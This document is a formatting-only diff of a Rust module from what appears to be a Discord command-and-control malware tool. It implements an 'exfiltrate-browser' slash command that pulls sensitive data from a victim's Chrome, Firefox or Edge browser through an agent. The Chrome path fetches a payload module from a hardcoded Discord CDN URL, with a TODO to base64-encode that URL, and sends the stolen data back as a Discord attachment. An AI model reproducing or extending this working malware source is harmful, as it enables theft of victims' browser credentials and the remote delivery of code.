@@ -1,25 +1,28 @@
-use crate::errors::DiscordC2Error;
-use crate::os::download::{download_browser_module, generate_attachment};
-
 use serenity::{
-    builder::CreateApplicationCommand,
-    client::Context,
-    model::{
-        application::{
-            command::CommandOptionType,
-            interaction::{
-                application_command::{
-                    ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue,
-                },
-                InteractionResponseType,
-            },
-        },
-        channel::AttachmentType,
-    },
+	builder::CreateApplicationCommand,
+	client::Context,
+	model::{
+		application::{
+			command::CommandOptionType,
+			interaction::{
+				application_command::{
+					ApplicationCommandInteraction,
+					CommandDataOption,
+					CommandDataOptionValue,
+				},
+				InteractionResponseType,
+			},
+		},
+		channel::AttachmentType,
+	},
 };
-
 use tempfile::TempDir;
 use uuid::Uuid;
+
+use crate::{
+	errors::DiscordC2Error,
+	os::download::{download_browser_module, generate_attachment},
+};
 
 /// Registers the "exfiltrate-browser" application command with the provided `CreateApplicationCommand` builder.
 /// This command allows users to exfiltrate sensitive data from their browsers via the agent.
@@ -48,20 +51,20 @@ use uuid::Uuid;
 /// Note that this function does not actually register the command with Discord. To do that, you must call the
 /// `http.create_global_application_command` method on a `Http` client object.
 pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
-    // Create the purge command.
-    command
-        .name("exfiltrate-browser")
-        .description("Exfiltrates sensitive data from the user's browsers via the agent.")
-        .create_option(|option| {
-            option
-                .name("browser")
-                .description("A supported browser (chrome, firefox, edge)")
-                .kind(CommandOptionType::String)
-                .add_string_choice("Chrome", "Chrome")
-                .add_string_choice("Firefox", "Firefox")
-                .add_string_choice("Edge", "Edge")
-                .required(true)
-        })
+	// Create the purge command.
+	command
+		.name("exfiltrate-browser")
+		.description("Exfiltrates sensitive data from the user's browsers via the agent.")
+		.create_option(|option| {
+			option
+				.name("browser")
+				.description("A supported browser (chrome, firefox, edge)")
+				.kind(CommandOptionType::String)
+				.add_string_choice("Chrome", "Chrome")
+				.add_string_choice("Firefox", "Firefox")
+				.add_string_choice("Edge", "Edge")
+				.required(true)
+		})
 }
 
 /// Exfiltrates sensitive data from the user's browser via the agent, and returns the exfiltrated data (if any).
@@ -100,23 +103,23 @@ pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicatio
 /// Note that this function assumes that the `exfiltrate_browser` function will return a valid `AttachmentType`
 /// object.
 pub async fn run(options: &[CommandDataOption]) -> Option<AttachmentType> {
-    let option = options
-        .get(0)
-        .expect("Expected browser option.")
-        .resolved
-        .as_ref()
-        .expect("Expected browser object.");
+	let option = options
+		.get(0)
+		.expect("Expected browser option.")
+		.resolved
+		.as_ref()
+		.expect("Expected browser object.");
 
-    if let CommandDataOptionValue::String(browser) = option {
-        match browser.as_str() {
-            "Chrome" => exfiltrate_browser("Chrome").await,
-            "Firefox" => exfiltrate_browser("Firefox").await,
-            "Edge" => exfiltrate_browser("Edge").await,
-            _ => panic!("Unsupported browser: {}", browser),
-        }
-    } else {
-        None
-    }
+	if let CommandDataOptionValue::String(browser) = option {
+		match browser.as_str() {
+			"Chrome" => exfiltrate_browser("Chrome").await,
+			"Firefox" => exfiltrate_browser("Firefox").await,
+			"Edge" => exfiltrate_browser("Edge").await,
+			_ => panic!("Unsupported browser: {}", browser),
+		}
+	} else {
+		None
+	}
 }
 
 /// Handles the `/exfiltrate-browser` command by running the `exfiltrate::run` function to exfiltrate data from
@@ -152,28 +155,28 @@ pub async fn run(options: &[CommandDataOption]) -> Option<AttachmentType> {
 /// with a message indicating success and an attachment containing the exfiltrated data. If the exfiltration fails,
 /// this function responds to the interaction with a message indicating failure.
 pub async fn handle_exfiltrate(
-    ctx: &Context,
-    command: &ApplicationCommandInteraction,
+	ctx: &Context,
+	command: &ApplicationCommandInteraction,
 ) -> Result<(), DiscordC2Error> {
-    let attachment = run(&command.data.options).await;
+	let attachment = run(&command.data.options).await;
 
-    command
-        .create_interaction_response(&ctx.http, |response| {
-            response
-                .kind(InteractionResponseType::ChannelMessageWithSource)
-                .interaction_response_data(|message| {
-                    if let Some(att) = attachment {
-                        message.content("Successfully exfiltrated!");
-                        message.add_file(att);
-                    } else {
-                        message.content("Failed to exfiltrate :(");
-                    }
+	command
+		.create_interaction_response(&ctx.http, |response| {
+			response
+				.kind(InteractionResponseType::ChannelMessageWithSource)
+				.interaction_response_data(|message| {
+					if let Some(att) = attachment {
+						message.content("Successfully exfiltrated!");
+						message.add_file(att);
+					} else {
+						message.content("Failed to exfiltrate :(");
+					}
 
-                    message
-                })
-        })
-        .await?;
-    Ok(())
+					message
+				})
+		})
+		.await?;
+	Ok(())
 }
 
 /// Exfiltrates sensitive data from the user's browser, using the module corresponding to the specified `browser`
@@ -208,14 +211,14 @@ pub async fn handle_exfiltrate(
 /// If the download is successful, `handle_download` returns an `AttachmentType` object containing the content
 /// and filename of the exfiltrated file.
 async fn exfiltrate_browser(browser: &str) -> Option<AttachmentType<'static>> {
-    let temp_dir = TempDir::new().unwrap();
-    if browser == "Chrome" {
-        let url = "https://cdn.discordapp.com/attachments/1102741318905626688/1102746525035143299/3126786178316y237813"; //TODO: b64 encode this
-        let filename = "1";
-        Some(handle_download(temp_dir, url, filename).await)
-    } else {
-        None
-    }
+	let temp_dir = TempDir::new().unwrap();
+	if browser == "Chrome" {
+		let url = "https://cdn.discordapp.com/attachments/1102741318905626688/1102746525035143299/3126786178316y237813"; // TODO: b64 encode this
+		let filename = "1";
+		Some(handle_download(temp_dir, url, filename).await)
+	} else {
+		None
+	}
 }
 
 /// Downloads a file from the specified `url` and saves it to the specified `temp_file_path`. This function
@@ -250,9 +253,9 @@ async fn exfiltrate_browser(browser: &str) -> Option<AttachmentType<'static>> {
 /// `temp_dir`, with the specified `filename`. If the download is successful, this function reads the downloaded
 /// file into memory and returns an `AttachmentType` object containing the content and filename of the file.
 async fn handle_download(temp_dir: TempDir, url: &str, filename: &str) -> AttachmentType<'static> {
-    let temp_file_path = temp_dir.path().join(Uuid::new_v4().to_string());
-    download_browser_module(url, filename, &temp_file_path)
-        .await
-        .expect("Error when downloading the file.");
-    generate_attachment(temp_file_path).await.unwrap() // Reads the attachment data into memory and stores it in a `AttachmentType` object.
+	let temp_file_path = temp_dir.path().join(Uuid::new_v4().to_string());
+	download_browser_module(url, filename, &temp_file_path)
+		.await
+		.expect("Error when downloading the file.");
+	generate_attachment(temp_file_path).await.unwrap() // Reads the attachment data into memory and stores it in a `AttachmentType` object.
 }
